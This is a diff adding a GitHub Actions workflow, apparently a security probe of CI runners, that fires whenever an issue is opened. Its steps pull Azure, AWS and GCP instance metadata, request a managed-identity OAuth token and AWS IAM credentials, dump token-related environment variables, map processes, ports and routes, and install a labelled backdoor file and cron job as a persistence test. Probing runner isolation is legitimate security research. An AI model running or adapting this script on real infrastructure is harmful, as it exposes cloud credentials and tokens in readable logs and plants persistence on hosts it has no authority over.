@@ -1,0 +1,113 @@
+name: GHSEC - Metadata Service Exfiltration Test
+
+on:
+  workflow_dispatch:
+  issues:
+    types: [opened]
+
+jobs:
+  metadata-recon:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Azure Metadata Service - Instance Info
+        run: |
+          echo "=== AZURE INSTANCE METADATA ==="
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -100 || echo "BLOCKED"
+          echo ""
+
+      - name: Azure Metadata Service - Compute
+        run: |
+          echo "=== COMPUTE METADATA ==="
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null | head -50 || echo "RAW:"
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>&1 | head -50
+          echo ""
+
+      - name: Azure Metadata Service - Network
+        run: |
+          echo "=== NETWORK METADATA ==="
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" 2>&1 | head -50 || echo "BLOCKED"
+          echo ""
+
+      - name: Azure Metadata Service - Identity Token
+        run: |
+          echo "=== MANAGED IDENTITY TOKEN ==="
+          # Try to get an Azure AD token for the managed identity
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" 2>&1 | python3 -m json.tool 2>/dev/null || echo "RAW:"
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" 2>&1 | head -20
+          echo ""
+
+      - name: Azure Metadata Service - Attested Data
+        run: |
+          echo "=== ATTESTED DATA ==="
+          curl -s -H "Metadata: true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1 | head -50 || echo "BLOCKED"
+          echo ""
+
+      - name: AWS Metadata Service Check
+        run: |
+          echo "=== AWS IMDS CHECK ==="
+          # AWS-style endpoints (some Azure VMs may proxy these)
+          curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -20 || echo "NO AWS METADATA"
+          curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>&1 | head -20 || echo "NO AWS IAM ROLE"
+          echo ""
+
+      - name: GCP Metadata Service Check
+        run: |
+          echo "=== GCP METADATA CHECK ==="
+          curl -s -H "Metadata-Flavor: Google" --max-time 3 \
+            "http://metadata.google.internal/computeMetadata/v1/" 2>&1 | head -20 || echo "NO GCP METADATA"
+          echo ""
+
+      - name: Environment & Process Recon
+        run: |
+          echo "=== ENVIRONMENT VARIABLES (filtered) ==="
+          env | grep -iE "(azure|aws|gcp|cloud|token|identity|metadata|msi)" || echo "No cloud env vars"
+          echo ""
+          echo "=== RUNNING PROCESSES ==="
+          ps aux | grep -v "^USER" | awk '{print $1, $11}' | sort | uniq -c | sort -rn | head -20
+          echo ""
+          echo "=== LISTENING PORTS ==="
+          ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20
+          echo ""
+          echo "=== ROUTES ==="
+          ip route 2>/dev/null || route -n 2>/dev/null
+          echo ""
+
+      - name: Long-running persistence test
+        run: |
+          echo "=== PERSISTENCE TEST ==="
+          echo "Started at: $(date)"
+          echo "Writing backdoor file..."
+          echo "PERSISTENT_BACKDOOR=$(date)" > /tmp/ghsec_backdoor_test.txt
+          echo "Installing cron..."
+          (crontab -l 2>/dev/null; echo "* * * * * echo 'GHSEC_CRON' >> /tmp/ghsec_cron_test.txt") | crontab -
+          echo "Cron installed. Waiting 2 minutes to verify..."
+          sleep 120
+          echo ""
+          echo "Cron test results:"
+          cat /tmp/ghsec_cron_test.txt 2>/dev/null || echo "No cron output yet"
+          echo ""
+          echo "Backdoor file still present:"
+          cat /tmp/ghsec_backdoor_test.txt 2>/dev/null || echo "GONE"
+          echo ""
+          echo "Finished at: $(date)"
+          echo "NOTE: This VM will be destroyed after job completes"
+
+      - name: Post-wait verification
+        run: |
+          echo "=== POST-WAIT CHECK ==="
+          echo "Backdoor file:"
+          cat /tmp/ghsec_backdoor_test.txt 2>/dev/null || echo "GONE"
+          echo ""
+          echo "Cron output:"
+          cat /tmp/ghsec_cron_test.txt 2>/dev/null || echo "NONE"
+          echo ""
+          echo "Process count:"
+          ps aux | wc -l
